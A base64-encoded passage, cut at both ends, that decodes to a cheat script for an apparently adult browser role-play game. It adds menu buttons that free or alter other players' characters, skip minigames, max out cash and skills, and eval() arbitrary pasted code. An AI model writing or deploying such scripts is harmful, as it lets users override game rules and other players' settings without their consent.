3VzdG9tIGNvbnRleHQgbWVudSBidXR0b25zCmZ1bmN0aW9uIGNyZWF0ZUJ1dHRvbih0ZXh0LCBvbkNsaWNrKSB7CiAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIHZhciBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGJ1dHRvbi5pbm5lckhUTUwgPSB0ZXh0OwogICAgYnV0dG9uLm9uY2xpY2sgPSBvbkNsaWNrOwogICAgYnV0dG9uLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgYnV0dG9uLnN0eWxlLnRleHRBbGlnbiA9ICJsZWZ0IjsKICAgIGJ1dHRvbi5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICBidXR0b24uc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwogICAgcmV0dXJuIGJ1dHRvbjsKfQoKLy8gQ3JlYXRlIHNlcGFyYXRvciBmdW5jdGlvbgpmdW5jdGlvbiBjcmVhdGVTZXBhcmF0b3IoKSB7CiAgICB2YXIgc2VwYXJhdG9yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaHIiKTsKICAgIHNlcGFyYXRvci5zdHlsZS5tYXJnaW4gPSAiNXB4IDAiOwogICAgcmV0dXJuIHNlcGFyYXRvcjsKfQoKLy8gRnVuY3Rpb24gdG8gZGlzcGxheSBjdXN0b20gY29udGV4dCBtZW51X19fX18KbGV0IGNvbnRleHRNZW51VGltZXIgPSBudWxsOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjb250ZXh0bWVudSIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGNvbnRleHRNZW51T3BlbikgewogICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgIHJldHVybjsgLy8gUHJldmVudCBkdXBlIG1lbnVzCiAgfQogIGlmICh3aW5kb3cuZ2V0U2VsZWN0aW9uKCkudG9TdHJpbmcoKSAhPT0gJycpIHsKICAgIC8vIEFsbG93IHJlZ3VsYXIgY29udGV4dCBtZW51IHdoZW4gdGV4dCBpcyBoaWdobGlnaHRlZAogICAgcmV0dXJuOwogIH0KICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogIHZhciBjb250ZXh0TWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGNvbnRleHRNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICBjb250ZXh0TWVudS5zdHlsZS5iYWNrZ3JvdW5kID0gImxpbmVhci1ncmFkaWVudCh0byBib3R0b20sIHdoaXRlLCB3aGl0ZSkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJveFNoYWRvdyA9ICIwIDAgM3B4ICM5OTkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJvcmRlclJhZGl1cyA9ICI4cHgiOwogIGNvbnRleHRNZW51LnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkIGJsYWNrIjsKICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIGlmICgnb250b3VjaHN0YXJ0JyBpbiB3aW5kb3cpIHsKICAgIC8vIEhhbmRsZSBsb25nIHByZXNzIG9uIG1vYmlsZSBkZXZpY2VzCiAgICBjb250ZXh0TWVudVRpbWVyID0gc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgY29udGV4dE1lbnUuc3R5bGUudG9wID0gZXZlbnQudG91Y2hlc1swXS5jbGllbnRZICsgInB4IjsKICAgICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WCArICJweCI7CiAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwogICAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogICAgfSwgNTAwKTsKICB9IGVsc2UgewogICAgLy8gSGFuZGxlIHJpZ2h0IGNsaWNrIG9uIGRlc2t0b3AgZGV2aWNlcwogICAgY29udGV4dE1lbnUuc3R5bGUudG9wID0gZXZlbnQuY2xpZW50WSArICJweCI7CiAgICBjb250ZXh0TWVudS5zdHlsZS5sZWZ0ID0gZXZlbnQuY2xpZW50WCArICJweCI7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgfQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICBjbGVhclRpbWVvdXQoY29udGV4dE1lbnVUaW1lcik7CiAgfSk7CiAgICAKCgogICAgLy8gSGVhZGVyIHdpdGggQkNNIGxvZ28KICAgIHZhciBoZWFkZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgaGVhZGVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgIGhlYWRlci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CgogICAgdmFyIHByb2ZpbGVQaG90byA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgcHJvZmlsZVBob3RvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLndpZHRoID0gIjMwcHgiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLmhlaWdodCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMjAlIjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5tYXJnaW5SaWdodCA9ICIxMHB4IjsKCiAgICB2YXIgaGVhZGVyVGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgaGVhZGVyVGV4dC5pbm5lckhUTUwgPSAiPGI+RXNzZW50aWFsczwvYj4iOwoKICAgIGhlYWRlci5hcHBlbmRDaGlsZChwcm9maWxlUGhvdG8pOwogICAgaGVhZGVyLmFwcGVuZENoaWxkKGhlYWRlclRleHQpOwoKIC8vIEN1c3RvbSBtYWluIGJ1dHRvbnMKIHZhciBidXR0b24xID0gY3JlYXRlQnV0dG9uKCJSZXN0b3JlIENoYXJhY3RlciIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuQXBwZWFyYW5jZSA9IENoYXRTZWFyY2hTYWZld29yZEFwcGVhcmFuY2Uuc2xpY2UoMCk7ICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7ICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgCn0pOwp2YXIgYnV0dG9uMiA9IGNyZWF0ZUJ1dHRvbigiRm9yY2UgUm9vbSBTd2FwIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkNoYXRTZWxlY3RTdGFydFNlYXJjaCgnWCcpLENoYXRSb29tU2V0TGFzdENoYXRSb29tKCcnKSxkb2N1bWVudFsnZ2V0RWxlbWVudEJ5SWQnXSgnSW5wdXRDaGF0JylbJ3N0eWxlJ11bJ2Rpc3BsYXknXT0nbm9uZScsZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ1RleHRBcmVhQ2hhdExvZycpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLENoYXRTZWxlY3RTdGFydFNlYXJjaCgnWCcpLENoYXRSb29tU2V0TGFzdENoYXRSb29tKCcnKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b24zID0gY3JlYXRlQnV0dG9uKCJGcmVlIFRhcmdldCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGFyYWN0ZXJSZWxlYXNlVG90YWwoQ3VycmVudENoYXJhY3RlciksQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNCA9IGNyZWF0ZUJ1dHRvbigiUmVtb3ZlIFJlc3RyYWludCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlVbmxvY2soQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgSW52ZW50b3J5UmVtb3ZlKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNSA9IGNyZWF0ZUJ1dHRvbigiVGFyZ2V0IFN0cnVnZ2xlIERpZmZpY3VsdHkiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6ZG97dmFyIGRpZmM9cHJvbXB0KCdEaWZmaWN1bHR5XHgyMDEtOTYnKTt9d2hpbGUoIShkaWZjPj0weDEmJmRpZmM8PTB4NjApKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1IZWFkIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aDIiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aDMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Bcm1zIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGFuZHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1MZWdzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRXllcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUZlZXQiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1EZXZpY2VzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQWRkb24iLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja1Jlc3RyYWludHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrQWNjZXNzb3JpZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Cb290cyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhvb2QiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ob3NlIiwgZGlmYyk7CiAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b242ID0gY3JlYXRlQnV0dG9uKCJPcGVuIFRhcmdldCBXYXJkcm9iZSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpEaWFsb2dDaGFuZ2VDbG90aGVzKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNyA9IGNyZWF0ZUJ1dHRvbigiQ29tcGxldGUgU3RydWdnbGUgTWluaWdhbWUiLCBmdW5jdGlvbigpIHsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgamF2YXNjcmlwdDpTdHJ1Z2dsZVByb2dyZXNzID0xMDAwOwogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICB9LCA1MDApOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKCnZhciBidXR0b244ID0gY3JlYXRlQnV0dG9uKCJJbnZpc2libGUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgIEhlaWdodDogIi0iCiAgICAgIH07CiAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOyAKICAgICAgdmlzYiA9IGZhbHNlOwogICAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgIHVwZGF0ZUNvbnRleHRNZW51KCk7IAoKICAgIAp9KTsKCnZhciBidXR0b245ID0gY3JlYXRlQnV0dG9uKCJWaXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDpDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgdmlzYiA9IHRydWU7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKICAKfSk7Cgp2YXIgYnV0dG9uMTAgPSBjcmVhdGVCdXR0b24oIkN1c3RvbSBTY3JpcHQiLCBmdW5jdGlvbigpIHsKICBqYXZhc2NyaXB0OnZhciBzY3JwID0gcHJvbXB0KCJQYXN0ZSB5b3VyIHNjcmlwdCBoZXJlOiIpOwogIGlmIChzY3JwKSB7CiAgICBldmFsKHNjcnApOwogICAgc2hvd1RvYXN0c2NwZygpOwogIH0KfSk7Ci8vIFRyYW5zaXRpb24gc3R5bGluZyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjIuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24zLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjUuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b242LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjguc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b245LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMTAuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwoKCgovL0hvdmVyIGV2ZW50cyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwogICAgdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7CiAgICB9KTsKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewogICAgdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKICAgIH0pOwoKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTAuNXB4IjsKfSk7CmJ1dHRvbjcuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjEwLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCi8vRHJvcGRvd24gTWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKZnVuY3Rpb24gZm9yY2VjbG9zZW1lbnUoKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgRGlhbG9nTGVhdmUoKTsKICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICB9CgogLy8gQ3JlYXRlIHRoZSBkcm9wZG93biBtZW51CnZhciBzZWxlY3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzZWxlY3QiKTsKc2VsZWN0LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIycHgiOwpzZWxlY3Quc3R5bGUucGFkZGluZyA9ICI0cHgiOwpzZWxlY3Quc3R5bGUud2lkdGggPSAiMjAwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luVG9wID0gIi0yMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblJpZ2h0ID0gIjJweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiM3B4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMnB4IjsKdmFyIG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMS52YWx1ZSA9ICJvcHQxIjsKb3B0aW9uMS50ZXh0ID0gIlBlcnNvbmFsaXNhdGlvbiBNZW51IjsKb3B0aW9uMS5zZWxlY3RlZCA9IHRydWU7Cm9wdGlvbjEuZGlzYWJsZWQgPSB0cnVlOwp2YXIgb3B0aW9uMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24yLnZhbHVlID0gIm9wdDIiOwpvcHRpb24yLnRleHQgPSAiRWRpdCBDYXNoIjsKdmFyIG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMy52YWx1ZSA9ICJvcHQzIjsKb3B0aW9uMy50ZXh0ID0gIk1heCBTa2lsbHMiOwp2YXIgb3B0aW9uNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb240LnZhbHVlID0gIm9wdDQiOwpvcHRpb240LnRleHQgPSAiTWF4IFJlcHV0YXRpb24iOwp2YXIgb3B0aW9uNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb241LnZhbHVlID0gIm9wdDUiOwpvcHRpb241LnRleHQgPSAiUHVyY2hhc2UgRXZlcnl0aGluZyI7CnZhciBvcHRpb242ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjYudmFsdWUgPSAib3B0NiI7Cm9wdGlvbjYudGV4dCA9ICJSZWxlYXNlIE93bmVyIENvbGxhciI7CnZhciBvcHRpb243ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjcudmFsdWUgPSAib3B0NyI7Cm9wdGlvbjcudGV4dCA9ICIrMSBMQVJQIExldmVsIjsKdmFyIG9wdGlvbjggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOC52YWx1ZSA9ICJvcHQ4IjsKb3B0aW9uOC50ZXh0ID0gIkJlY29tZSBFc2NhcGVkIFBhdGllbnQiOwp2YXIgb3B0aW9uOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb245LnZhbHVlID0gIm9wdDkiOwpvcHRpb245LnRleHQgPSAiQmVjb21lIENsdWIgU2xhdmUiOwp2YXIgb3B0aW9uMTAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTAudmFsdWUgPSAib3B0MTAiOwpvcHRpb24xMC50ZXh0ID0gIlJlbGVhc2UgQ2x1YiBUaXRsZSI7CnZhciBvcHRpb24xMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMS52YWx1ZSA9ICJvcHQxMSI7Cm9wdGlvbjExLnRleHQgPSAiU2V0IEdHVFMgTGV2ZWwiOwp2YXIgb3B0aW9uMTIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTIudmFsdWUgPSAib3B0MTIiOwpvcHRpb24xMi50ZXh0ID0gIlNldCBEb20vU3ViIExldmVsIjsKdmFyIG9wdGlvbjEzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEzLnZhbHVlID0gIm9wdDEzIjsKb3B0aW9uMTMudGV4dCA9ICJTZXQgTmlja25hbWUiOwp2YXIgb3B0aW9uMTQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTQudmFsdWUgPSAib3B0MTQiOwpvcHRpb24xNC50ZXh0ID0gIkZvcmNlIE9yZ2FzbSI7CnZhciBvcHRpb24xNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNS52YWx1ZSA9ICJvcHQxNSI7Cm9wdGlvbjE1LnRleHQgPSAiQkNNIERpc2NvcmQiOwp2YXIgb3B0aW9uMTYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTYudmFsdWUgPSAib3B0MTYiOwpvcHRpb24xNi50ZXh0ID0gIkZvcmNlIExvYmJ5IjsKdmFyIG9wdGlvbjE3ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE3LnZhbHVlID0gIm9wdDE3IjsKb3B0aW9uMTcudGV4dCA9ICJMQVJQIE9wdGlvbnMiOwp2YXIgb3B0aW9uMTggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTgudmFsdWUgPSAib3B0MTgiOwpvcHRpb